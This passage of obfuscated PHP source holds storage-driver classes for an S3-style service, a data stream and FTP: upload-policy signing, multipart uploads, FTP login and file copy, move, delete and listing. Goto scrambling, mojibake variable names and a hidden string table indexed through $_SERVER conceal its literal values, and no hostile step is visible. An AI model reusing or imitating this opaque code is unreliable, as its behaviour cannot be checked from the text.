PathDriverBaseS3 { public function __construct($dëÜ‰¥åÇ…) { parent::__construct($dëÜ‰¥åÇ…); } public function uploadFormData($A’„ŒòŞÎ¥, $b¹‡¤ª¹ˆé = 3600) { goto f– ğÏò…™; c—Ä Û·†é: $b§ÄÌšßÇ„ = array($fÇÙòà¤¸[209] => $fÇÙòà¤¸[33], $fÇÙòà¤¸[1212] => $fÇÙòà¤¸[33], $fÇÙòà¤¸[1170] => $CäÁÑ‡ŒÉ, $fÇÙòà¤¸[1174] => $E‚¨‡éğœ, $fÇÙòà¤¸[1178] => $e‡ÙøÀ®é, $fÇÙòà¤¸[1213] => $A¨ôñÖºÙ, $fÇÙòà¤¸[1214] => $e¶ŠÑ«×£Ê, $fÇÙòà¤¸[1215] => $aÚâ³°ì á, $fÇÙòà¤¸[1216] => $Cšäçìæ…, $fÇÙòà¤¸[1217] => $E¿èÛĞ‰œ, $fÇÙòà¤¸[175] => $this->getHost()); return $b§ÄÌšßÇ„; goto d›ÚïÑª“; e«Ğ½ì™Âï: $cæ·¿×¬¾ = $fÇÙòà¤¸[1202]; $Cšäçìæ… = $b¹‡¤ª¹ˆé . $fÇÙòà¤¸[33]; $E‚¨‡éğœ = $fÇÙòà¤¸[1166]; goto DéœÚåãƒ‰; DéœÚåãƒ‰: $Dˆ¥Œ ±†¢ = array($this->accessKey, $fËåË¤ªÆ…, $this->region, $f«ˆÊË— , $cæ·¿×¬¾); $A¨ôñÖºÙ = implode($fÇÙòà¤¸[8], $Dˆ¥Œ ±†¢); $DÀŠÛ²ö×Í = array($fÇÙòà¤¸[1168] => gmdate($fÇÙòà¤¸[1167], strtotime($fÇÙòà¤¸[1203])), $fÇÙòà¤¸[1169] => array(array($fÇÙòà¤¸[1171] => $this->bucket), array($fÇÙòà¤¸[1170] => $CäÁÑ‡ŒÉ), array($fÇÙòà¤¸[1172], $fÇÙòà¤¸[1173], $fÇÙòà¤¸[33]), array($fÇÙòà¤¸[1172], $fÇÙòà¤¸[1204], $fÇÙòà¤¸[33]), array($fÇÙòà¤¸[1172], $fÇÙòà¤¸[1205], $fÇÙòà¤¸[33]), array($fÇÙòà¤¸[1174] => $E‚¨‡éğœ), array($fÇÙòà¤¸[1206] => $A¨ôñÖºÙ), array($fÇÙòà¤¸[1207] => $e¶ŠÑ«×£Ê), array($fÇÙòà¤¸[1208] => $aÚâ³°ì á), array($fÇÙòà¤¸[1209] => $Cšäçìæ…))); goto F’¾§ÚîØº; Dªƒ‡Ğê¾¦: $f«ˆÊË—  = $fÇÙòà¤¸[59]; $aÚâ³°ì á = gmdate($fÇÙòà¤¸[1201]); $fËåË¤ªÆ… = gmdate($fÇÙòà¤¸[706]); goto e«Ğ½ì™Âï; c‡ŒÑñÈ‚: $c¬îµñ÷÷‘ = hash_hmac($fÇÙòà¤¸[1210], $f«ˆÊË— , $aê­¥Öƒù, !0); $BÀô°ÚëÁ = hash_hmac($fÇÙòà¤¸[1210], $cæ·¿×¬¾, $c¬îµñ÷÷‘, !0); $E¿èÛĞ‰œ = hash_hmac($fÇÙòà¤¸[1210], $e‡ÙøÀ®é, $BÀô°ÚëÁ); goto c—Ä Û·†é; F’¾§ÚîØº: $e‡ÙøÀ®é = base64_encode(json_encode($DÀŠÛ²ö×Í)); $cÒ·¸ø¯¡ = hash_hmac($fÇÙòà¤¸[1210], $fËåË¤ªÆ…, $fÇÙòà¤¸[1211] . $this->secret, !0); $aê­¥Öƒù = hash_hmac($fÇÙòà¤¸[1210], $this->region, $cÒ·¸ø¯¡, !0); goto c‡ŒÑñÈ‚; f– ğÏò…™: $fÇÙòà¤¸ =& $_SERVER[¹…ÕÄ]; $CäÁÑ‡ŒÉ = $fÇÙòà¤¸[191]; $e¶ŠÑ«×£Ê = $fÇÙòà¤¸[1200]; goto Dªƒ‡Ğê¾¦; d›ÚïÑª“: } public function multiUploadFormData($FŞ‚²˜Ñ , $F¹«ç«ïÓ” = 3600) { $bÃ¯Ú¼Şºà =& $_SERVER[¹…ÕÄ]; $C¨´Ùí§À = gmdate($bÃ¯Ú¼Şºà[1296]); $c±¸¯Ó²…æ = array(); $e¾´Á‰–™ = $this->client->getUploadId($this->bucket, $FŞ‚²˜Ñ , $c±¸¯Ó²…æ); if (!$e¾´Á‰–™) { return !1; } return array($bÃ¯Ú¼Şºà[219] => $e¾´Á‰–™, $bÃ¯Ú¼Şºà[175] => $this->getHost() . $bÃ¯Ú¼Şºà[8] . $this->pathEncode($FŞ‚²˜Ñ ), $bÃ¯Ú¼Şºà[220] => $C¨´Ùí§À, $bÃ¯Ú¼Şºà[92] => $FŞ‚²˜Ñ ); } public function multiUploadAuthData($E“õ‘…½ø, $F¸ÒÌòª‹Ù = array()) { goto e¦Ç¤´‰½‚; d‚Â„¥•×ù: unset($F¸ÒÌòª‹Ù[$e¾¦ÑŞâš[92]]); if (isset($F¸ÒÌòª‹Ù[$e¾¦ÑŞâš[221]])) { return $this->listUploadParts($CÚ—Ê–ëôì, $F¸ÒÌòª‹Ù); } $Aë¨ô»¾ƒ¼ = array(); goto a“Å§â¸ÈÕ; EîÅõÙÓ÷À: if (strpos($eƒ¦Âé‰×‡, $e¾¦ÑŞâš[223]) === 0) { if (isset($Aë¨ô»¾ƒ¼[$e¾¦ÑŞâš[1298]])) { $FÒŒÍ’ªŠ = $Aë¨ô»¾ƒ¼[$e¾¦ÑŞâš[1298]]; } else { if (isset($F²Š‘ÜÛÑê[$e¾¦ÑŞâš[1298]])) { $FÒŒÍ’ªŠ = $F²Š‘ÜÛÑê[$e¾¦ÑŞâš[1298]]; } else { $FÒŒÍ’ªŠ = hash($e¾¦ÑŞâš[1210], $e¾¦ÑŞâš[33]); } } return array($e¾¦ÑŞâš[230] => $F²Š‘ÜÛÑê[$e¾¦ÑŞâš[230]], $e¾¦ÑŞâš[1298] => $FÒŒÍ’ªŠ, $e¾¦ÑŞâš[220] => $F²Š‘ÜÛÑê[$e¾¦ÑŞâš[1301]]); } return $F²Š‘ÜÛÑê[$e¾¦ÑŞâš[230]]; goto eŞŠÎ “ é; e¦Ç¤´‰½‚: $e¾¦ÑŞâš =& $_SERVER[¹…ÕÄ]; $eƒ¦Âé‰×‡ = isset($F¸ÒÌòª‹Ù[$e¾¦ÑŞâš[167]]) ? $F¸ÒÌòª‹Ù[$e¾¦ÑŞâš[167]] : $e¾¦ÑŞâš[33]; $CÚ—Ê–ëôì = $F¸ÒÌòª‹Ù[$e¾¦ÑŞâš[92]]; goto d‚Â„¥•×ù; c¡ÆÇé—óª: $CÒéÀĞëŸÉ = $e¾¦ÑŞâš[224]; $cƒ“ä”¬İ¬ = $e¾¦ÑŞâš[8] . $this->pathEncode($CÚ—Ê–ëôì) . $eƒ¦Âé‰×‡; $F²Š‘ÜÛÑê = $this->client->__getSignatureV4($Aë¨ô»¾ƒ¼, $Dää‘»ÅÏ, $CÒéÀĞëŸÉ, $cƒ“ä”¬İ¬); goto EîÅõÙÓ÷À; a“Å§â¸ÈÕ: if (isset($F¸ÒÌòª‹Ù[$e¾¦ÑŞâš[1297]])) { $Aë¨ô»¾ƒ¼[$e¾¦ÑŞâš[1298]] = $F¸ÒÌòª‹Ù[$e¾¦ÑŞâš[1297]]; } $eíÛøÅ›ªğ = explode($e¾¦ÑŞâš[177], $this->getHost()); $Dää‘»ÅÏ = array($e¾¦ÑŞâš[1299] => $eíÛøÅ›ªğ[1], $e¾¦ÑŞâš[1300] => $e¾¦ÑŞâš[33], $e¾¦ÑŞâš[209] => $e¾¦ÑŞâš[118], $e¾¦ÑŞâš[1212] => $F¸ÒÌòª‹Ù[$e¾¦ÑŞâš[77]]); goto c¡ÆÇé—óª; eŞŠÎ “ é: } public function listUploadParts($A†ÏŞ› ß½, $déÛ–­±‡‰ = array()) { goto c“‘—¯ŞËÕ; c“‘—¯ŞËÕ: $f˜‹ºÔ¿Ÿ =& $_SERVER[¹…ÕÄ]; $aƒ´ù‰Ç–° = str_replace($f˜‹ºÔ¿Ÿ[231], $f˜‹ºÔ¿Ÿ[33], $déÛ–­±‡‰[$f˜‹ºÔ¿Ÿ[167]]); $D‹Œ§º‘­± = $this->client->listParts($this->bucket, $A†ÏŞ› ß½, $aƒ´ù‰Ç–°); goto fçÀ®äÔÂÈ; BŒ­ß»ô·: $a×…Š„øó .= $f˜‹ºÔ¿Ÿ[1305]; $AÊÉ½„Õ±† = array(); $F´ ¿¹¤Ì = explode($f˜‹ºÔ¿Ÿ[177], $this->getHost()); goto f­ÌóÕ¦Ì¥; c“ËŠ•«ëá: $CŸ«—‹•ïà = $this->client->__getSignatureV4($AÊÉ½„Õ±†, $D©ÕˆËÑï£, $aÉªÌˆåòù, $F¹²‹ÙÀšó, $a×…Š„øó); return array($f˜‹ºÔ¿Ÿ[230] => $CŸ«—‹•ïà[$f˜‹ºÔ¿Ÿ[230]], $f˜‹ºÔ¿Ÿ[220] => $CŸ«—‹•ïà[$f˜‹ºÔ¿Ÿ[1301]], $f˜‹ºÔ¿Ÿ[232] => $D‹Œ§º‘­±, $f˜‹ºÔ¿Ÿ[1298] => $CŸ«—‹•ïà[$f˜‹ºÔ¿Ÿ[1298]]); goto d†Æ¾¶‚ÌË; f­ÌóÕ¦Ì¥: $D©ÕˆËÑï£ = array($f˜‹ºÔ¿Ÿ[1299] => $F´ ¿¹¤Ì[1], $f˜‹ºÔ¿Ÿ[209] => $f˜‹ºÔ¿Ÿ[118], $f˜‹ºÔ¿Ÿ[1212] => strlen($a×…Š„øó)); $aÉªÌˆåòù = $f˜‹ºÔ¿Ÿ[222]; $F¹²‹ÙÀšó = $f˜‹ºÔ¿Ÿ[8] . $this->pathEncode($A†ÏŞ› ß½) . $déÛ–­±‡‰[$f˜‹ºÔ¿Ÿ[167]]; goto c“ËŠ•«ëá; fçÀ®äÔÂÈ: if (!$D‹Œ§º‘­±) { return !1; } $a×…Š„øó = $f˜‹ºÔ¿Ÿ[1302]; foreach ($D‹Œ§º‘­± as $B‹ÕÑèÅ‹) { $a×…Š„øó .= $f˜‹ºÔ¿Ÿ[1303] . "\x3c\120\x61\x72\164\x4e\x75\x6d\x62\x65\x72\76{$B‹ÕÑèÅ‹[$f˜‹ºÔ¿Ÿ[1257]]}\74\x2f\x50\x61\x72\x74\116\165\155\x62\145\x72\76\12" . "\74\x45\124\141\x67\x3e{$B‹ÕÑèÅ‹[$f˜‹ºÔ¿Ÿ[1258]]}\74\x2f\105\124\x61\147\76\xa" . $f˜‹ºÔ¿Ÿ[1304]; } goto BŒ­ß»ô·; d†Æ¾¶‚ÌË: } public function link($c»ñ«ÅÔ³, $f¡“ˆâ¤¢“ = array()) { return parent::link($c»ñ«ÅÔ³, $f¡“ˆâ¤¢“); } public function fileOut($DğË½ÛĞÊ›, $CëöâÒ‚‘Õ = false, $C‚©´åâ = false, $AÙçø‚‡¸ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[¹…ÕÄ][1306])) { return parent::fileOutServer($DğË½ÛĞÊ›, $CëöâÒ‚‘Õ, $C‚©´åâ, $AÙçø‚‡¸); } parent::fileOut($DğË½ÛĞÊ›, $CëöâÒ‚‘Õ, $C‚©´åâ, $AÙçø‚‡¸); } public function fileOutImage($a¾™Èã»ø, $C¡ã®‰…ºË = 250) { if (strstr($this->endpoint, $_SERVER[¹…ÕÄ][1306])) { return parent::fileOutImageServer($a¾™Èã»ø, $C¡ã®‰…ºË); } parent::fileOutImage($a¾™Èã»ø, $C¡ã®‰…ºË); } public function fileOutLink($cÍÎîĞ£ÇË) { $e£ñèˆª =& $_SERVER[¹…ÕÄ]; if (substr($cÍÎîĞ£ÇË, 0, 7) == $e£ñèˆª[1181]) { $cÍÎîĞ£ÇË = $e£ñèˆª[1182] . substr($cÍÎîĞ£ÇË, 7); } header($e£ñèˆª[158] . $cÍÎîĞ£ÇË); die; } public function getHost() { $bÃÅÚÁ›™¦ =& $_SERVER[¹…ÕÄ]; $AÔĞ¦Â§¡í = str_rtrim(parent::getHost(), $bÃÅÚÁ›™¦[8] . $this->bucket); $AÔĞ¦Â§¡í = explode($bÃÅÚÁ›™¦[177], $AÔĞ¦Â§¡í); return $AÔĞ¦Â§¡í[0] . $bÃÅÚÁ›™¦[177] . $this->bucket . $bÃÅÚÁ›™¦[94] . $AÔĞ¦Â§¡í[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($c„Æ»ŠÈÎ´, $eÌ—ƒÒ÷¤ù = 0) { parent::__construct(); $this->source = $c„Æ»ŠÈÎ´; $this->sourceSize = $eÌ—ƒÒ÷¤ù; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($FšĞ¯Æ = false) { return $this->sourceSize; } public function getContent($bçç‡ÓÙ†¬ = false) { return $this->fileSubstr($bçç‡ÓÙ†¬, 0, $this->sourceSize); } public function fileSubstr($bËƒ‘ˆøµ = false, $aƒÚ‘°¾çó = 0, $EŠé·¹ˆ¼ = 0) { if (!$EŠé·¹ˆ¼) { $EŠé·¹ˆ¼ = $this->sourceSize; } $c¸ìá™â„¡ = $this->sourceSize - $aƒÚ‘°¾çó; if ($EŠé·¹ˆ¼ >= $c¸ìá™â„¡) { $EŠé·¹ˆ¼ = $c¸ìá™â„¡; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $aƒÚ‘°¾çó, $EŠé·¹ˆ¼); } if ($this->sourceType == self::TYPE_FILE) { if ($EŠé·¹ˆ¼ <= 0) { return $_SERVER[¹…ÕÄ][33]; } $Bˆñùöê¸Å = ftell($this->source); fseek_64($this->source, $Bˆñùöê¸Å + $aƒÚ‘°¾çó); $Fğ…Ì™ØÉĞ = @fread($this->source, $EŠé·¹ˆ¼); fseek_64($this->source, $Bˆñùöê¸Å); return $Fğ…Ì™ØÉĞ; } } public function hashMd5($f§å“åî‡ = false) { return md5($this->getContent()); } public static function hash($aëíšòèÖï, $Cô­Â¥¹’® = 0) { $Cí¶Ò“šµ¬ = new PathDriverStream($aëíšòèÖï, $Cô­Â¥¹’®); return $Cí¶Ò“šµ¬->hashSimple($aëíšòèÖï); } public static function md5($EƒÄÈÄìø, $EŒè»Ì®Ó = 0) { $CÊï¸ ¡™ä = new PathDriverStream($EƒÄÈÄìø, $EŒè»Ì®Ó); return $CÊï¸ ¡™ä->hashMd5($EƒÄÈÄìø); } } goto Câà…ĞĞ¦; fÜ·µ˜Æ¤º: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; private $config = array(); public function __construct($fÀÁ­”©Ì) { parent::__construct(); if (count($fÀÁ­”©Ì) > 0) { $this->_init($fÀÁ­”©Ì); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($fŒ«¥èèá­) { $eÄ÷Úòé„§ =& $_SERVER[¹…ÕÄ]; global $config; $this->appCharset = $config[$eÄ÷Úòé„§[1218]]; $this->systemCharset = $config[$eÄ÷Úòé„§[1219]]; if (isset($fŒ«¥èèá­[$eÄ÷Úòé„§[1220]]) && $fŒ«¥èèá­[$eÄ÷Úòé„§[1220]]) { $this->systemCharset = $fŒ«¥èèá­[$eÄ÷Úòé„§[1220]]; } } public function iconvApp($F÷¶‘ÀÒèé) { return $this->iconvTo($F÷¶‘ÀÒèé, $this->systemCharset, $this->appCharset); } public function iconvSystem($bóÕ×â‡’) { return $this->iconvTo($bóÕ×â‡’, $this->appCharset, $this->systemCharset); } public function getPathOuter($C¥Ë÷„¿ô¤) { goto fİÓÄˆàÛÙ; a©Õö²àó¼: if (substr($a¿àéÇ£†µ, 0, 2) == $d¡ùˆÊ¼Í†[1221]) { $a¿àéÇ£†µ = BASIC_PATH . substr($a¿àéÇ£†µ, 2); } if (substr($C¥Ë÷„¿ô¤, 0, 2) == $d¡ùˆÊ¼Í†[1221]) { $C¥Ë÷„¿ô¤ = BASIC_PATH . substr($C¥Ë÷„¿ô¤, 2); } $a¿àéÇ£†µ = KodIO::clear($a¿àéÇ£†µ); goto a™­­—é; a™­­—é: $C¥Ë÷„¿ô¤ = KodIO::clear($C¥Ë÷„¿ô¤); $C¥Ë÷„¿ô¤ = substr($C¥Ë÷„¿ô¤, strlen($a¿àéÇ£†µ)); if (empty($this->pathDriver)) { return $C¥Ë÷„¿ô¤; } goto EÎî‡„Œ×ó; EÎî‡„Œ×ó: return $this->pathDriver . $d¡ùˆÊ¼Í†[8] . ltrim($C¥Ë÷„¿ô¤, $d¡ùˆÊ¼Í†[8]); goto eÈ®’Ø‹Í; fİÓÄˆàÛÙ: $d¡ùˆÊ¼Í† =& $_SERVER[¹…ÕÄ]; $a¿àéÇ£†µ = $this->iconvApp($this->pathBase); $C¥Ë÷„¿ô¤ = $this->iconvApp($C¥Ë÷„¿ô¤); goto a©Õö²àó¼; eÈ®’Ø‹Í: } private function _init($aºÈ¨ÁŞ¦¹ = array()) { $CßÚ„ˆ¨ˆ =& $_SERVER[¹…ÕÄ]; if (!function_exists($CßÚ„ˆ¨ˆ[1222])) { throw new Exception(LNG($CßÚ„ˆ¨ˆ[1223])); } $this->config = $aºÈ¨ÁŞ¦¹; $this->charsetReset($aºÈ¨ÁŞ¦¹); foreach ($aºÈ¨ÁŞ¦¹ as $CîêëÕäØ => $FÕó©Ú„Œ) { if (isset($this->{$CîêëÕäØ})) { $this->{$CîêëÕäØ} = $FÕó©Ú„Œ; } } return $this->_login($aºÈ¨ÁŞ¦¹); } private function _login($fğè Ãçº’) { goto eÙŸ™¬â©; eÙŸ™¬â©: $c—¶šö´™ô =& $_SERVER[¹…ÕÄ]; static $f™Ñ±ä‡Ğ = array(); $Eá‡–«ÊŠÔ = md5(json_encode($fğè Ãçº’)); goto e˜¨èöÜëœ; e˜¨èöÜëœ: if (isset($f™Ñ±ä‡Ğ[$Eá‡–«ÊŠÔ])) { foreach ($f™Ñ±ä‡Ğ[$Eá‡–«ÊŠÔ] as $aÄƒ¸—Ù => $fóÓœ¨¨É¿) { $this->{$aÄƒ¸—Ù} = $fóÓœ¨¨É¿; } return !0; } $FÚ¬ÉÍÓ„« = parse_url(trim($this->server, $c—¶šö´™ô[8])); $this->host = $FÚ¬ÉÍÓ„«[$c—¶šö´™ô[175]]; goto Dóæ¼¹Ø‹¢; Dóæ¼¹Ø‹¢: $F¯Ü•äí–Ì = isset($FÚ¬ÉÍÓ„«[$c—¶šö´™ô[174]]) && $FÚ¬ÉÍÓ„«[$c—¶šö´™ô[174]] == $c—¶šö´™ô[1224] ? !0 : !1; $this->scheme = $F¯Ü•äí–Ì ? $c—¶šö´™ô[1225] : $c—¶šö´™ô[1226]; $this->port = isset($FÚ¬ÉÍÓ„«[$c—¶šö´™ô[176]]) ? $FÚ¬ÉÍÓ„«[$c—¶šö´™ô[176]] : 21; goto AÇ·®öÂ¢è; aæšâ¼Ôß¤: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $D¯‰„¹ÙÛ³ = $this->pasv == $c—¶šö´™ô[86] ? !0 : !1; @ftp_pasv($this->connect, $D¯‰„¹ÙÛ³); goto cõÅôàˆ’Å; AÇ·®öÂ¢è: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $CÙŠ¿œÈì‡ = @ftp_login($this->connect, $this->username, $this->userpass); goto aæšâ¼Ôß¤; cõÅôàˆ’Å: $f™Ñ±ä‡Ğ[$Eá‡–«ÊŠÔ] = array($c—¶šö´™ô[1227] => $this->connect, $c—¶šö´™ô[175] => $this->host, $c—¶šö´™ô[174] => $this->scheme, $c—¶šö´™ô[176] => $this->port); return $CÙŠ¿œÈì‡; goto D‚·‘•ÇÏ™; D‚·‘•ÇÏ™: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($d‡ìÎ¨¬…, $fŸíÜ—÷ = '', $FŠ¬ƒµ¾ÕÑ = REPEAT_RENAME) { if ($this->setContent($d‡ìÎ¨¬…, $fŸíÜ—÷)) { return $this->getPathOuter($d‡ìÎ¨¬…); } return !1; } public function mkdir($EÓàö§Ëö‡, $Bƒ´Êîø˜ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $EÓàö§Ëö‡ = $this->iconvSystem($EÓàö§Ëö‡); if ($this->_isFolder($EÓàö§Ëö‡) || @ftp_mkdir($this->connect, $EÓàö§Ëö‡)) { return $this->getPathOuter($EÓàö§Ëö‡); } if (!$this->mkdir($this->pathFather($EÓàö§Ëö‡))) { return !1; } if ($EÓàö§Ëö‡ = @ftp_mkdir($this->connect, $EÓàö§Ëö‡)) { return $this->getPathOuter($EÓàö§Ëö‡); } return !1; } public function copyFile($F«¡¡¬”½ß, $BÖ»ÉÍ‡æ¯) { goto d˜ïÖŠïò; bÌŒÆŠ¹ƒÀ: $a­Ğòë·å» = $this->iconvApp($bÒø‡¯ˆ¢); $this->download($F«¡¡¬”½ß, $a­Ğòë·å»); $fÌæê±˜¹ = $this->upload($BÖ»ÉÍ‡æ¯, $a­Ğòë·å»); goto E™Óâô†İï; d˜ïÖŠïò: if (!$this->_isconn()) { return !1; } $bŒôÎ³–ÂÈ = $this->pathThis($this->iconvSystem($F«¡¡¬”½ß)); $bÒø‡¯ˆ¢ = $this->tempFile($bŒôÎ³–ÂÈ); goto bÌŒÆŠ¹ƒÀ; E™Óâô†İï: $this->tempFileRemve($bÒø‡¯ˆ¢); return $fÌæê±˜¹; goto eï³¾¾ÖÚ; eï³¾¾ÖÚ: } public function moveFile($e‚Öƒ°¶´ß, $dÉã·“µó) { if (!$this->_isconn()) { return !1; } $e‚Öƒ°¶´ß = $this->iconvSystem($e‚Öƒ°¶´ß); $dÉã·“µó = $this->iconvSystem($dÉã·“µó); $Eñã–Š¼„ = @ftp_rename($this->connect, $e‚Öƒ°¶´ß, $dÉã·“µó); return $Eñã–Š¼„ ? $this->getPathOuter($dÉã·“µó) : !1; } public function delFile($CÈ‡¢ªé ) { if (!$this->_isconn()) { return !1; } $CÈ‡¢ªé  = $this->iconvSystem($CÈ‡¢ªé ); return @ftp_delete($this->connect, $CÈ‡¢ªé ); } public function delFolder($D”•åÔ±’–) { goto A¢–‘îÚäù; EªÖÔ”º: $this->fileList($D”•åÔ±’–, $c ˜Ç‘Ã£–, $CØÈßê©”, !0); $this->listItemCache = !0; foreach ($CØÈßê©” as $Bã…‹–Ÿ¶İ) { $CËÎÚí›³” = $this->iconvSystem($Bã…‹–Ÿ¶İ[$_SERVER[¹…ÕÄ][28]]); $D†Œà¿½×» = @ftp_delete($this->connect, $CËÎÚí›³”); if (!$D†Œà¿½×») { return !1; } } goto F¾ÕÛš‡ç˜; F¾ÕÛš‡ç˜: foreach ($c ˜Ç‘Ã£– as $CËÎÚí›³”) { $CËÎÚí›³” = $this->iconvSystem($CËÎÚí›³”); $D†Œà¿½×» = @ftp_rmdir($this->connect, $CËÎÚí›³”); if (!$D†Œà¿½×») { return !1; } } $D”•åÔ±’– = $this->iconvSystem($D”•åÔ±’–); return @ftp_rmdir($this->connect, $D”•åÔ±’–); goto aå±Ù³£åİ; A¢–‘îÚäù: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $c ˜Ç‘Ã£– = $CØÈßê©” = array(); goto EªÖÔ”º; aå±Ù³£åİ: } public function rename($AÉÍƒäÂáˆ, $fĞùÖ•–‡š) { goto cÃÁï¿Ûğ»; E™‰å†õ†£: return $dÙĞİ²ÚÉ ? $this->getPathOuter($cğÃİøàª«) : !1; goto b’»‘‡”; F¦İ•İËµÖ: $F›¶«Ğ„² = $this->iconvSystem($F›¶«Ğ„²); $AÉÍƒäÂáˆ = $this->iconvSystem($AÉÍƒäÂáˆ); $eÊå¼­èø™ = $this->pathFather($AÉÍƒäÂáˆ); goto eˆ¥ˆ‹ÖŸ¬; cÃÁï¿Ûğ»: $cØè–’’‰— =& $_SERVER[¹…ÕÄ]; if (!$this->_isconn()) { return !1; } $F›¶«Ğ„² = $this->fileNameAuto($this->pathFather($AÉÍƒäÂáˆ), $fĞùÖ•–‡š); goto F¦İ•İËµÖ; eˆ¥ˆ‹ÖŸ¬: $cğÃİøàª« = rtrim($eÊå¼­èø™, $cØè–’’‰—[8]) . $cØè–’’‰—[8] . $F›¶«Ğ„²; $dÙĞİ²ÚÉ = @ftp_rename($this->connect, $AÉÍƒäÂáˆ, $cğÃİøàª«); $cğÃİøàª« = $this->iconvApp($cğÃİøàª«); goto E™‰å†õ†£; b’»‘‡”: } private function folderInfo($cÍÑ´‹æ‰Ü, $e×‘¨†¾°Š = false) { $FÕğ×®×Øæ =& $_SERVER[¹…ÕÄ]; $FÉ®öØ²¶Ñ = array($FÕğ×®×Øæ[28] => $this->pathThis($cÍÑ´‹æ‰Ü), $FÕğ×®×Øæ[75] => $this->getPathOuter($FÕğ×®×Øæ[8] . $cÍÑ´‹æ‰Ü), $FÕğ×®×Øæ[29] => $FÕğ×®×Øæ[76]); if ($e×‘¨†¾°Š) { return $FÉ®öØ²¶Ñ; } $FÉ®öØ²¶Ñ[$FÕğ×®×Øæ[192]] = $FÉ®öØ²¶Ñ[$FÕğ×®×Øæ[83]] = 0; $FÉ®öØ²¶Ñ[$FÕğ×®×Øæ[193]] = $FÉ®öØ²¶Ñ[$FÕğ×®×Øæ[194]] = !0; return $FÉ®öØ²¶Ñ; } private function fileInfo($CŠ˜’¾ß“, $E‡ªÚÎç°Ú = false, $Dš´¢ƒß½Ø = array()) { goto A¶ì³‹°‚; C˜²‹¹í”Ñ: $E¡Áğ÷½¯[$bİà¶É¡³·[192]] = $E¡Áğ÷½¯[$bİà¶É¡³·[83]] = 0; $E¡Áğ÷½¯[$bİà¶É¡³·[193]] = $E¡Áğ÷½¯[$bİà¶É¡³·[194]] = !0; $C‰…–÷…®¥ = $this->iconvSystem($CŠ˜’¾ß“); goto b°Ò»„äé­; b°Ò»„äé­: $E¡Áğ÷½¯[$bİà¶É¡³·[83]] = @ftp_mdtm($this->connect, $C‰…–÷…®¥); if (empty($Dš´¢ƒß½Ø)) { $Dš´¢ƒß½Ø = $this->objectMeta($CŠ˜’¾ß“); if (!$Dš´¢ƒß½Ø) { return $E¡Áğ÷½¯; } } $E¡Áğ÷½¯[$bİà¶É¡³·[77]] = $Dš´¢ƒß½Ø[$bİà¶É¡³·[77]]; goto bçª¾Òçá; bçª¾Òçá: return $E¡Áğ÷½¯; goto Eô…‹öÒ‡Œ; A¶ì³‹°‚: $bİà¶É¡³· =& $_SERVER[¹…ÕÄ]; $E¡Áğ÷½¯ = array($bİà¶É¡³·[28] => $this->pathThis($CŠ˜’¾ß“), $bİà¶É¡³·[75] => $this->getPathOuter($bİà¶É¡³·[8] . $CŠ˜’¾ß“), $bİà¶É¡³·[29] => $bİà¶É¡³·[173], $bİà¶É¡³·[77] => isset($Dš´¢ƒß½Ø[$bİà¶É¡³·[77]]) ? $Dš´¢ƒß½Ø[$bİà¶É¡³·[77]] : 0, $bİà¶É¡³·[167] => $this->ext($CŠ˜’¾ß“)); if ($E‡ªÚÎç°Ú) { return $E¡Áğ÷½¯; } goto C˜²‹¹í”Ñ; Eô…‹öÒ‡Œ: } public function size($C¤óêŸ’›Ó) { $C˜”Ğì—™Ÿ = $this->objectMeta($C¤óêŸ’›Ó); return $C˜”Ğì—™Ÿ ? $C˜”Ğì—™Ÿ[$_SERVER[¹…ÕÄ][77]] : 0; } public function info($A©Ş«ïŠÔ¶) { if ($this->isFile($A©Ş«ïŠÔ¶)) { return $this->fileInfo($A©Ş«ïŠÔ¶, 0); } else { if ($this->isFolder($A©Ş«ïŠÔ¶)) { return $this->folderInfo($A©Ş«ïŠÔ¶); } } return !1; } private function fileList($d„ÑÖóš¿ª, &$F×âæ•Ô§, &$bœ¯Â„¾§, $e‚œøó•î» = false) { goto D¿½ÕœÓé; eãË¡ˆ£ö†: $bˆçÈºƒî¦ = $this->listItemCache === !1 ? !1 : !0; $fïÜÀÄœ®Õ = @ftp_rawlist($this->connect, $d„ÑÖóš¿ª); if (!$fïÜÀÄœ®Õ) { $fïÜÀÄœ®Õ = array(); } goto DÔ±Çë£Ê; Cì®¥ŒñÜ—: @ftp_chdir($this->connect, $B¬·› ¿±ñ[8]); $d„ÑÖóš¿ª = rtrim($d„ÑÖóš¿ª, $B¬·› ¿±ñ[8]) . $B¬·› ¿±ñ[8]; check_abort(); goto eãË¡ˆ£ö†; DÔ±Çë£Ê: $C‰” „Û§ = array($B¬·› ¿±ñ[94] => 1, $B¬·› ¿±ñ[1228] => 1); foreach ($fïÜÀÄœ®Õ as $fî¤„‹Ëì÷) { goto B“ŸÃê¿á‹; B“ŸÃê¿á‹: $EªÅî«Ñ‹® = $this->_listItem($fî¤„‹Ëì÷); if ($EªÅî«Ñ‹®[0] == $B¬·› ¿±ñ[711]) { continue; } $Aˆñ¶ƒ¢é = $EªÅî«Ñ‹®[8]; goto D“àÚèê¨; D“àÚèê¨: if (!$Aˆñ¶ƒ¢é || isset($C‰” „Û§[$Aˆñ¶ƒ¢é])) { continue; } $Aˆñ¶ƒ¢é = $this->iconvApp($d„ÑÖóš¿ª . ltrim($Aˆñ¶ƒ¢é, $B¬·› ¿±ñ[8])); $DÃ”Œ¥­³ = array($B¬·› ¿±ñ[28] => $Aˆñ¶ƒ¢é, $B¬·› ¿±ñ[29] => $B¬·› ¿±ñ[173], $B¬·› ¿±ñ[77] => $EªÅî«Ñ‹®[4]); goto fÍßğ¨İ¸‘; eø†àî†Å: if ($f›¾±™‘®¿) { $F×âæ•Ô§[] = $Aˆñ¶ƒ¢é; if ($e‚œøó•î») { $this->fileList($Aˆñ¶ƒ¢é, 